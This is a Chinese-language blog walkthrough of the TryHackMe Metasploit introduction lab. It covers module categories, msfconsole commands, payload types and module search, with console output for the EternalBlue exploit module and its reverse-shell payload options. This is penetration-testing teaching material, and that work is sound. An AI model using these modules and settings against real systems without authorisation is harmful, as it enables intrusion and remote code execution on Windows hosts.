<html>
<head>
    <meta charset="utf-8" />
<meta name="description" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>Tryhackme-Metasploit: Introduction | F9F</title>

<link rel="shortcut icon" href="https://f9f.fun/favicon.ico?v=1695121195895">

<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
<link rel="stylesheet" href="/styles/main.css">

<style>
    hr {
        margin-top: 1rem;
        margin-bottom: 1rem;
        border: 0;
        border-top: 1px solid rgba(0, 0, 0, 0.1);
    }
</style>

<script src="/media/scripts/highlight.min.js"></script>
<script src="/media/scripts/dockerfile.min.js"></script>
<script src="/media/scripts/dart.min.js"></script>


<canvas class="fireworks" style="position:fixed;left:0;top:0;z-index:99999999;pointer-events:none;"> </canvas>
<script type="text/javascript" src="/media/scripts/anime.min.js"></script>
<script type="text/javascript" src="/media/scripts/fireworks.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
</head>
<body>
<div class="main gt-bg-theme-color-first">
    <script src="/media/scripts/aplayer/APlayer.min.js"></script>
<link rel="stylesheet" href="/media/scripts/aplayer/APlayer.min.css">
<div id="aplayer" class="aplayer"  data-id="" data-server="netease" data-type="playlist" data-fixed="true" data-listfolded="true" data-order="random" data-theme="#F58EA8"></div>
<script src="/media/scripts/jquery-ui.js"></script>
<script src="/media/scripts/jquery-ui.min.js"></script>

<script src="/media/scripts/time_add.js"></script></br>
<style>
    /* 导航栏样式 */
    .navbar {
        position: relative;
        display: -ms-flexbox;
        display: flex;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
        -ms-flex-align: center;
        align-items: center;
        -ms-flex-pack: justify;
        justify-content: space-between;
        padding: 0.5rem 1rem;
    }

    .navbar-brand {
        display: inline-block;
        padding-top: 0.3125rem;
        padding-bottom: 0.3125rem;
        margin-right: 1rem;
        font-size: 1.25rem;
        line-height: inherit;
        white-space: nowrap;
    }

    .navbar-brand:hover,
    .navbar-brand:focus {
        text-decoration: none;
    }

    .navbar-nav {
        display: -ms-flexbox;
        display: flex;
        -ms-flex-direction: column;
        flex-direction: column;
        padding-left: 0;
        margin-bottom: 0;
        list-style: none;
    }

    .navbar-collapse {
        -ms-flex-preferred-size: 100%;
        flex-basis: 100%;
        -ms-flex-positive: 1;
        flex-grow: 1;
        -ms-flex-align: center;
        align-items: center;
    }

    .navbar-toggler {
        padding: 0.25rem 0.75rem;
        font-size: 1.25rem;
        line-height: 1;
        background-color: transparent;
        border: 1px solid transparent;
        border-radius: 0.25rem;
    }

    .navbar-toggler:hover,
    .navbar-toggler:focus {
        text-decoration: none;
    }

    @media (min-width: 992px) {
        .navbar-expand-lg {
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -ms-flex-pack: start;
            justify-content: flex-start;
        }

        .navbar-expand-lg .navbar-nav {
            -ms-flex-direction: row;
            flex-direction: row;
        }

        .navbar-expand-lg .navbar-collapse {
            display: -ms-flexbox !important;
            display: flex !important;
            -ms-flex-preferred-size: auto;
            flex-basis: auto;
        }

        .navbar-expand-lg .navbar-toggler {
            display: none;
        }
    }

    @media (max-width: 991px) {
        #navbarSupportedContent {
            display: none;
        }
    }
</style>

<!-- <button id="myImg">分享出去</button> -->

<script src="/media/scripts/jquery-3.5.1.min.js"></script>
<script src="/media/scripts/jquery-ui.js"></script>
<script src="/media/scripts/jquery-ui.min.js"></script>
<script src="/media/scripts/index.js"></script>


<link rel="stylesheet" href="/media/script/jquery-ui.min.css">

<nav class="navbar navbar-expand-lg">
    <div class="navbar-brand"  id="myImg" title="点我分享出去哦~">
        <img class="user-avatar" src="/images/avatar.png" alt="头像">
        <div class="site-name gt-c-content-color-first">
            F9F
        </div>
    </div>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="right_list">
        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
    </button>

    <div class="list_menu">
    <div class="list_right">
        <div class="navbar-nav mr-auto" style="text-align: center">
            
            <div class="nav-item">
                
                <a href="/" class="menu gt-a-link">
                    首页
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/archives" class="menu gt-a-link">
                    归档
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/tags" class="menu gt-a-link">
                    标签
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/post/about" class="menu gt-a-link">
                    关于
                </a>
                
            </div>
            
        </div>
    </div>
    </div>

    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <div class="navbar-nav mr-auto" style="text-align: center">
            
            <div class="nav-item">
                
                <a href="/" class="menu gt-a-link">
                    首页
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/archives" class="menu gt-a-link">
                    归档
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/tags" class="menu gt-a-link">
                    标签
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/post/about" class="menu gt-a-link">
                    关于
                </a>
                
            </div>
            
        </div>
        <div style="text-align: center">
            <form id="gridea-search-form" style="position: relative" data-update="1695121195895"
                action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
            </form>
        </div>
    </div>
</nav>
<script>
    /* 移动端导航栏展开/收起切换 */
    document.getElementById('changeNavbar').onclick = function () {
        var element = document.getElementById('navbarSupportedContent');
        if (element.style.display === 'none' || element.style.display === '') {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    }
</script>
<script type="text/javascript" src="/media/scripts/mouse_text.js"></script>
    <div class="post-container">
        <div class="post-detail gt-bg-theme-color-second">
            <article class="gt-post-content">
                <h2 class="post-title">
                    Tryhackme-Metasploit: Introduction
                </h2>
                <div class="post-info">
                    <time class="post-time gt-c-content-color-first">
                        · 2023-07-20 ·
                    </time>
                    
                </div>
                <div class="post-content">
                    <h2 id="tryhackme-metasploit-introduction">Tryhackme-Metasploit: Introduction</h2>
<h2 id="1metasploit简介">1.Metasploit简介</h2>
<p>Metasploit是使用最广泛的开发框架。Metasploit是一个强大的工具，可以支持渗透测试的所有阶段，从信息收集到开发后。</p>
<p>Metasploit有两个主要版本：</p>
<ul>
<li><strong>Metasploit Pro</strong>：促进任务自动化和管理的商业版本。此版本具有图形用户界面 （GUI）。</li>
<li><strong>Metasploit Framework</strong>：从命令行工作的开源版本。这个房间将重点介绍这个版本，安装在AttackBox上，以及最常用的渗透测试Linux发行版。</li>
</ul>
<p>Metasploit 框架是一组工具，允许信息收集、扫描、利用、利用开发、后利用等。虽然Metasploit框架的主要用途集中在渗透测试领域，但它对于漏洞研究和漏洞利用开发也很有用。</p>
<p>Metasploit框架的主要组成部分可以总结如下;</p>
<ul>
<li><strong>msfconsole</strong>：主命令行界面。</li>
<li><strong>Modules</strong>：支持漏洞利用、扫描、有效负载等<strong>模块</strong>。</li>
<li><strong>Tools</strong>：有助于漏洞研究、漏洞评估或渗透测试的独立<strong>工具</strong>。其中一些工具是msfvenom，pattern_create和pattern_offset。我们将在本模块中介绍msfvenom，但pattern_create和pattern_offset是有用的工具，超出了本模块的范围。</li>
</ul>
<p>本文将介绍 Metasploit 的主要组件，同时为您提供有关如何在目标系统上查找相关漏洞、设置参数和利用易受攻击的服务的坚实基础。完成此房间后，您将能够舒适地导航和使用Metasploit命令行。</p>
<h2 id="2metasploit的主要组成">2.Metasploit的主要组成</h2>
<p>在使用Metasploit Framework时，主要与Metasploit控制台进行交互。可以使用msfconsole命令从AttackBox终端启动控制台。控制台将成为与Metasploit Framework的不同模块进行交互的主要界面。模块是Metasploit框架中的小组件，用于执行特定任务，例如利用漏洞、扫描目标或执行暴力攻击。</p>
<p>在深入研究模块之前，有必要澄清一些重复出现的概念：漏洞、利用和载荷。</p>
<p>利用：利用目标系统上存在的漏洞的代码片段。 漏洞：影响目标系统的设计、编码或逻辑缺陷。利用漏洞可能会导致泄露机密信息或允许攻击者在目标系统上执行代码。 载荷：利用将利用漏洞。然而，如果我们希望利用产生我们想要的结果（访问目标系统、读取机密信息等），我们需要使用载荷。载荷是将在目标系统上运行的代码。</p>
<p>模块和每个模块下的类别如下所示。这些仅供参考，但您将通过Metasploit控制台（msfconsole）与它们进行交互。</p>
<h3 id="辅助模块-auxiliary">辅助模块 Auxiliary</h3>
<p>任何支持模块，如扫描仪、爬行器和模糊器，都可以在这里找到。</p>
<p>终端</p>
<pre><code class="language-markup">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit

20 directories, 2 files
</code></pre>
<h3 id="编码模块-encoders">编码模块 Encoders</h3>
<p>编码器将允许您对攻击和有效载荷进行编码，希望基于签名的防病毒解决方案可能会错过它们。</p>
<p>基于签名的防病毒和安全解决方案具有已知威胁的数据库。它们通过将可疑文件与该数据库进行比较来检测威胁，并在有匹配项时发出警报。因此，编码器可能只有有限的成功率，因为防病毒解决方案可以执行附加检查。</p>
<pre><code class="language-markup">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86

10 directories, 0 files
</code></pre>
<h3 id="规避-evasion">规避 Evasion</h3>
<p>尽管编码器会对有效载荷进行编码，但不应被视为直接试图逃避防病毒软件。另一方面，“逃避”模块将尝试这样做，成功与否则不一。</p>
<pre><code class="language-markup">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb

1 directory, 9 files
</code></pre>
<h3 id="利用-exploits">利用 Exploits</h3>
<p>漏洞利用，按目标系统整齐地组织。</p>
<pre><code class="language-markup">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
</code></pre>
<h3 id="无操作-nops">无操作 NOPs</h3>
<p>NOPs是一种空操作指令，用于在程序中不执行任何操作。</p>
<p>NOP（No OPeration）什么都不做，字面意思上是这样的。在英特尔x86 CPU系列中，它们用0x90表示，之后CPU将不执行任何操作一个周期。它们经常被用作缓冲来实现一致的有效载荷大小。</p>
<pre><code class="language-markup">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
</code></pre>
<h3 id="payloads">Payloads</h3>
<p>有效载荷是在目标系统上运行的代码。</p>
<p>利用将利用目标系统上的漏洞，但为了实现期望的结果，我们需要一个有效载荷。例如，获取一个shell，将恶意软件或后门加载到目标系统中，运行一个命令，或者启动calc.exe作为概念验证以添加到渗透测试报告中。通过启动calc.exe应用程序在目标系统上远程启动计算器是一种无害的方式，可以显示我们可以在目标系统上运行命令。</p>
<p>在目标系统上运行命令已经是一个重要的步骤，但是拥有一个允许您输入命令并在目标系统上执行的交互式连接更好。这样的交互式命令行被称为&quot;shell&quot;。Metasploit提供了发送不同有效载荷的能力，可以在目标系统上打开shell。</p>
<pre><code class="language-markup">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages

4 directories, 0 files
</code></pre>
<p>在payloads目录下，你将看到四个不同的目录：adapters、singles、stagers和stages。</p>
<p><strong>Adapters</strong>（适配器）：适配器将单个payload进行包装，将其转换为不同的格式。例如，一个普通的单个payload可以被包装在Powershell适配器中，这将生成一个单个的Powershell命令来执行payload。<br>
<strong>Singles</strong>（单个）：自包含的payload（添加用户、启动notepad.exe等），不需要下载额外的组件来运行。<br>
<strong>Stagers</strong>（分阶段）：负责在Metasploit和目标系统之间建立连接通道。在使用分阶段的payload时非常有用。“分阶段的payload”首先会在目标系统上上传一个stager，然后再下载其余的payload（stage）。这样做有一些优势，因为初始payload的大小相对较小，与一次性发送的完整payload相比。<br>
<strong>Stages</strong>（阶段）：由stager下载。这将允许您使用更大尺寸的payload。<br>
Metasploit有一种巧妙的方法来帮助您区分单个（也称为“内联”）payload和分阶段的payload。</p>
<p>generic/shell_reverse_tcp<br>
windows/x64/shell/reverse_tcp<br>
两者都是反向Windows shell。前者是内联（或单个）payload，如“shell”和“reverse”之间的“_”所示。而后者是分阶段的payload，如“shell”和“reverse”之间的“/”所示。</p>
<h3 id="post">POST</h3>
<p>“在上述列出的渗透测试过程的最后阶段，后期利用模块将非常有用。”</p>
<pre><code class="language-terminal">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows

12 directories, 0 files
</code></pre>
<p>如果您希望进一步熟悉这些模块，您可以在Metasploit安装的模块文件夹中找到它们。对于AttackBox而言，它们位于/opt/metasploit-framework/embedded/framework/modules目录下。</p>
<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230720132814680.png" alt="image-20230720132814680" loading="lazy"></figure>
<h2 id="3msfconsole">3.Msfconsole</h2>
<p>如前所述，控制台将是Metasploit框架的主界面。您可以在您的攻击箱终端或安装了Metasploit框架的任何系统上使用msfconsole命令启动它。</p>
<p>msfconsole</p>
<pre><code class="language-shell-session">root@ip-10-10-220-191:~# msfconsole 
                                                  

                 _---------.
             .' #######   ;.&quot;
  .---,.    ;@             @@`;   .---,..
.&quot; @@@@@'.,'@@            @@@@@',.'@@@@ &quot;.
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     &quot;--'.@@@  -.@        @ ,'-   .'--&quot;
          &quot;.@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,.&quot;    \|--- \_____________/
                  '(.,....&quot;/


       =[ metasploit v6.0                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search

msf6 &gt;
</code></pre>
<p>启动后，您将看到命令行更改为msf6(或msf5，具体取决于Metasploit的安装版本)。Metasploit控制台(msfconsole)可以像普通的命令行shell一样使用，如下所示。第一个命令是ls，它列出使用msfconsole命令从其中启动Metasploit的文件夹的内容。</p>
<p>之后是发送到Google的DNS IP地址(8.8.8.8)的ping。当我们从AttackBox操作时，它是Linux，我们必须添加-c 1选项，所以只发送一个ping。否则，ping进程将继续，直到使用CTRL+C停止为止。</p>
<p>Linux Commands in Metasploit</p>
<pre><code class="language-shell-session">msf6 &gt; ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 &gt; ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms
msf6 &gt;
</code></pre>
<p>它将支持大多数Linux命令，包括clear(清除终端屏幕)，但不允许您使用常规命令行的某些功能(例如，不支持输出重定向)，如下所示。</p>
<p>Failed Output Redirection</p>
<pre><code class="language-shell-session">msf6 &gt; help &gt; help.txt
[-] No such command
msf6 &gt;
</code></pre>
<p>在这个主题中，help命令可以单独使用，也可以用于特定的命令。下面是set命令的帮助菜单，我们将很快介绍。</p>
<p>Help feature</p>
<pre><code class="language-shell-session">msf6 &gt; help set
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 &gt;
</code></pre>
<p>您可以使用history命令查看您之前键入的命令。</p>
<p>History command</p>
<pre><code class="language-shell-session">msf6 &gt; history
1  use exploit/multi/http/nostromo_code_exec
2  set lhost 10.10.16.17
3  set rport 80
4  options
5  set rhosts 10.10.29.187
6  run
7  exit
8  exit -y
9  version
10  use exploit/multi/script/web_delivery
</code></pre>
<p>msfconsole的一个重要特性是支持选项卡完成。这将在以后使用Metasploit命令或处理模块时派上用场。例如，如果您开始键入he并按tab键，您将看到它自动完成以提供帮助。</p>
<p>Msfconsole是由上下文管理的;这意味着，除非设置为全局变量，否则如果您更改已决定使用的模块，所有参数设置都将丢失。在下面的示例中，我们使用了ms17_010_eternalblue漏洞，并设置了RHOSTS等参数。如果我们要切换到另一个模块(例如端口扫描仪)，我们需要再次设置RHOSTS值，因为我们所做的所有更改都保留在ms17_010_eternalblue漏洞的上下文中。</p>
<p>让我们看一下下面的例子，以便更好地理解这个特性。我们将使用MS17-010“永恒之蓝”漏洞进行说明。</p>
<p>一旦你输入use exploit/windows/smb/ms17_010_eternalblue命令，你会看到命令行提示符从msf6变为“msf6 exploit(windows/smb/ms17_010_eternalblue)”。据称，“永恒之蓝”是美国国家安全局(nsa)针对众多Windows系统上的SMBv1服务器漏洞开发的一个漏洞。SMB (Server Message Block)在Windows网络中广泛用于文件共享，甚至用于向打印机发送文件。“永恒之蓝”于2017年4月被网络犯罪组织“影子经纪人”泄露。2017年5月，该漏洞在全球范围内被WannaCry勒索软件攻击利用。</p>
<p>Using an exploit</p>
<pre><code class="language-shell-session">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>也可以使用use命令和搜索结果行开头的数字来选择要使用的模块。</p>
<p>虽然提示符发生了变化，但您会注意到我们仍然可以运行前面提到的命令。这意味着我们没有像在操作系统命令行中那样“输入”一个文件夹。</p>
<p>Linux commands within a context</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>提示告诉我们，我们现在有了一个上下文集，我们将在其中工作。您可以通过输入show options命令看到这一点。</p>
<p>Show options</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.220.191    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>这将打印与我们之前选择的漏洞相关的选项。show options命令将根据使用它的上下文有不同的输出。上面的例子表明，这个漏洞将要求我们设置像RHOSTS和RPORT这样的变量。另一方面，开发后模块可能只需要我们设置一个SESSION ID(见下面的截图)。会话是到目标系统的现有连接，开发后模块将使用该连接。</p>
<p>Options for a post-exploitation module</p>
<pre><code class="language-shell-session">msf6 post(windows/gather/enum_domain_users) &gt; show options

Module options (post/windows/gather/enum_domain_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HOST                      no        Target a specific host
   SESSION                   yes       The session to run this module on.
   USER                      no        Target User for NetSessionEnum

msf6 post(windows/gather/enum_domain_users) &gt;
</code></pre>
<p>show命令可以在任何上下文中使用，后面跟着模块类型(辅助、有效负载、利用等)来列出可用的模块。下面的示例列出了ms17-010 Eternalblue漏洞可以使用的有效负载。</p>
<p>The show payloads command</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support 
</code></pre>
<p>如果从msfconsole提示符中使用，show命令将列出所有模块。</p>
<p>到目前为止，我们看到的使用和显示选项命令对于Metasploit中的所有模块都是相同的。</p>
<p>您可以使用back命令离开上下文。</p>
<p>The back command</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back
msf6 &gt; 
</code></pre>
<p>任何模块的进一步信息都可以通过在其上下文中输入info命令来获得。</p>
<p>The info command</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Sean Dillon 
  Dylan Davis 
  Equation Group
  Shadow Brokers
  thelightcosine

Available targets:
  Id  Name
  --  ----
  0   Windows 7 and Server 2008 R2 (x64) All Service Packs

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
  RPORT          445              yes       The target port (TCP)
  SMBDomain      .                no        (Optional) The Windows domain to use for authentication
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again. The module will 
  attempt to use Anonymous login, by default, to authenticate to 
  perform the exploit. If the user supplies credentials in the 
  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
  On some systems, this module may cause system instability and 
  crashes, such as a BSOD or a reboot. This may be more likely with 
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://cvedetails.com/cve/CVE-2017-0143/
  https://cvedetails.com/cve/CVE-2017-0144/
  https://cvedetails.com/cve/CVE-2017-0145/
  https://cvedetails.com/cve/CVE-2017-0146/
  https://cvedetails.com/cve/CVE-2017-0147/
  https://cvedetails.com/cve/CVE-2017-0148/
  https://github.com/RiskSense-Ops/MS17-010

Also known as:
  ETERNALBLUE

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 
</code></pre>
<p>或者，您可以使用info命令，后面跟着msfconsole提示符中的模块路径(例如info exploit/windows/smb/ms17_010_eternalblue)。信息不是帮助菜单;它将显示模块的详细信息，如作者、相关来源等。</p>
<h3 id="search"><strong>Search</strong></h3>
<p>msfconsole中最有用的命令之一是搜索。该命令将在Metasploit Framework数据库中搜索与给定搜索参数相关的模块。您可以使用CVE编号、漏洞名称(eternalblue、heartbleed等)或目标系统进行搜索。</p>
<p>The search command</p>
<pre><code class="language-shell-session">msf6 &gt; search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 &gt;
</code></pre>
<p>搜索命令的输出提供了每个返回模块的概述。您可能会注意到&quot; name &quot;列已经提供了比模块名称更多的信息。您可以看到模块的类型(辅助、利用等)和模块的类别(扫描器、管理、窗口、Unix等)。您可以使用搜索结果中返回的任何模块，命令use后跟结果行开头的数字。(例如，使用0代替使用auxiliary/admin/smb/ms17_010_command)</p>
<p>返回的另一个重要信息在“rank”列中。漏洞是根据其可靠性进行评级的。下表提供了它们各自的描述。</p>
<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230720134018514.png" alt="image-20230720134018514" loading="lazy"></figure>
<p>Source: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking</p>
<p>您可以使用关键字(例如类型和平台)来指导搜索功能。</p>
<p>例如，如果希望搜索结果只包含辅助模块，则可以将类型设置为auxiliary。下面的屏幕截图显示了搜索类型:auxiliary telnet命令的输出。</p>
<p>Search by module type</p>
<pre><code class="language-shell-session">msf6 &gt; search type:auxiliary telnet

Matching Modules
================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal  No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
   1   auxiliary/admin/http/netgear_r6700_pass_reset       2020-06-15       normal  Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset
   2   auxiliary/dos/cisco/ios_telnet_rocem                2017-03-17       normal  No     Cisco IOS Telnet Denial of Service
   3   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   4   auxiliary/scanner/ssh/juniper_backdoor              2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   5   auxiliary/scanner/telnet/brocade_enable_login                        normal  No     Brocade Enable Login Check Scanner
   6   auxiliary/scanner/telnet/lantronix_telnet_password                   normal  No     Lantronix Telnet Password Recovery
   7   auxiliary/scanner/telnet/lantronix_telnet_version                    normal  No     Lantronix Telnet Service Banner Detection
   8   auxiliary/scanner/telnet/satel_cmd_exec             2017-04-07       normal  No     Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability
   9   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal  No     Telnet Service Encryption Key ID Overflow Detection
   10  auxiliary/scanner/telnet/telnet_login                                normal  No     Telnet Login Check Scanner
   11  auxiliary/scanner/telnet/telnet_ruggedcom                            normal  No     RuggedCom Telnet Password Generator
   12  auxiliary/scanner/telnet/telnet_version                              normal  No     Telnet Service Banner Detection
   13  auxiliary/server/capture/telnet                                      normal  No     Authentication Capture: Telnet


